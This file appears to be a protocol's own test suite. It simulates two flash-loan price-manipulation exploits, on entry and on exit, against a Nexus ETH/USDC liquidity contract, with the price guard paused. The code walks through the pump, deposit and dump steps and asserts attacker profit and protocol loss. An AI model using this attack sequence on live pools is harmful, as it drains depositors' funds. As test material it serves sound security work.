import {
  balanceETH,
  balanceUSDC,
  deadline,
  dumpPriceETH,
  initializeAndDepositUSDC,
  nexus,
  pumpPriceETH,
  quote,
  startNexusBalanceUSDC,
  usdcWhale,
} from "./test-base";
import { bn, bn18, bn6, ether, fmt18, fmt6, zero } from "../src/utils";
import { expect } from "chai";

describe("flashloan exploit simulation", () => {
  beforeEach(async () => {
    await initializeAndDepositUSDC();
    // we must disable price guard protection to demonstrate these exploits
    await nexus.methods.pausePriceGuard().send();
  });

  // extreme pump ETH price, pair all available USDC for little ETH, return ETH price to normal to create IL for both, no need to unpair
  it("exploit on entry", async () => {
    const startPrice = await quote();

    // for simplicity of the test, we are doing the attack from a whale that has lots of USDC
    // in the real world, the attacker could borrow USDC using a flash loan and become this whale temporarily
    const startBalanceETH = await balanceETH(usdcWhale);
    const startBalanceUSDC = await balanceUSDC(usdcWhale);

    const loanedUSDC = bn6("500,000,000");

    const amountToReturnETH = await pumpPriceETH(loanedUSDC); // extreme pump ETH price by doing a huge swap

    const available = bn(await nexus.methods.availableSpaceToDepositETH().call());
    await nexus.methods.addLiquidityETH(usdcWhale, deadline).send({ value: available, from: usdcWhale });

    await dumpPriceETH(amountToReturnETH); // bring ETH price back to normal by swapping back

    // removing liquidity is not necessary for the attack to be profitable
    // await nexus.methods.removeAllLiquidityETH(usdcWhale, deadline).send({ from: usdcWhale });

    console.log("exploit on entry results:");
    console.log("total loaned USDC", fmt6(loanedUSDC));
    const endDiffUSDC = (await balanceUSDC(usdcWhale)).sub(startBalanceUSDC);
    console.log("attacker diff USDC", fmt6(endDiffUSDC));
    expect(endDiffUSDC).bignumber.gt(zero); // attacker ended up with more USDC (the huge USDC loan was repaid)
    const endDiffETH = (await balanceETH(usdcWhale)).sub(startBalanceETH);
    console.log("attacker diff ETH", fmt18(endDiffETH));
    expect(endDiffETH).bignumber.lt(zero); // attacker loses a little ETH but this is negligible

    const lossETHinUSD = endDiffETH.abs().mul(startPrice).div(ether);
    console.log("attacker loss ETH in USD", fmt6(lossETHinUSD));

    const fee = loanedUSDC.muln(1).divn(1000);
    console.log("estimated fee USDC", fmt6(fee));

    const profit = endDiffUSDC.sub(fee).sub(lossETHinUSD);
    console.log("attacker estimated profit USDC", fmt6(profit));
    expect(profit).bignumber.gt(zero);

    const loss = (await balanceUSDC()).sub(startNexusBalanceUSDC);
    console.log("nexus loss USDC", fmt6(loss));
    expect(loss).bignumber.lt(zero);

    const endPrice = await quote();
    console.log("start price", fmt6(startPrice));
    console.log("end price", fmt6(endPrice));
    console.log("possible additional price arbitrage", fmt6(endPrice.sub(startPrice)));
  });

  // pair all available USDC, extreme dump ETH price to create IL for USDC provider, unpair, return ETH price to normal
  it("exploit on exit", async () => {
    const startPrice = await quote();

    // for simplicity of the test, we are doing the attack from a whale that has lots of ETH
    // in the real world, the attacker could borrow ETH using a flash loan and become this whale temporarily
    const startBalanceETH = await balanceETH(usdcWhale);
    const startBalanceUSDC = await balanceUSDC(usdcWhale);

    const available = bn(await nexus.methods.availableSpaceToDepositETH().call());
    await nexus.methods.addLiquidityETH(usdcWhale, deadline).send({ value: available, from: usdcWhale });

    const loanedETH = bn18("300,000");
    const totalLoanedETH = available.add(loanedETH);

    const amountToReturnUSDC = await dumpPriceETH(loanedETH); // extreme dump ETH price by doing a huge swap

    await nexus.methods.removeAllLiquidityETH(usdcWhale, deadline).send({ from: usdcWhale });

    await pumpPriceETH(amountToReturnUSDC); // bring ETH price back to normal by swapping back

    console.log("exploit on exit results:");
    console.log("total loaned ETH", fmt18(totalLoanedETH));
    const endDiffUSDC = (await balanceUSDC(usdcWhale)).sub(startBalanceUSDC);
    console.log("attacker diff USDC", fmt6(endDiffUSDC));
    expect(endDiffUSDC).bignumber.zero; // attacker did not lose any USDC
    const endDiffETH = (await balanceETH(usdcWhale)).sub(startBalanceETH);
    console.log("attacker diff ETH", fmt18(endDiffETH));
    expect(endDiffETH).bignumber.gt(zero); // attacker ended up with more ETH (the huge ETH loan was repaid)

    const fee = totalLoanedETH.muln(1).divn(1000);
    console.log("estimated fee ETH", fmt18(fee));

    const profit = endDiffETH.sub(fee);
    console.log("attacker estimated profit ETH", fmt18(profit));
    expect(profit).bignumber.gt(zero);

    const loss = (await balanceUSDC()).sub(startNexusBalanceUSDC);
    console.log("nexus loss USDC", fmt6(loss));
    expect(loss).bignumber.lt(zero);

    const endPrice = await quote();
    console.log("start price", fmt6(startPrice));
    console.log("end price", fmt6(endPrice));
    console.log("possible additional price arbitrage", fmt6(endPrice.sub(startPrice)));
  });
});
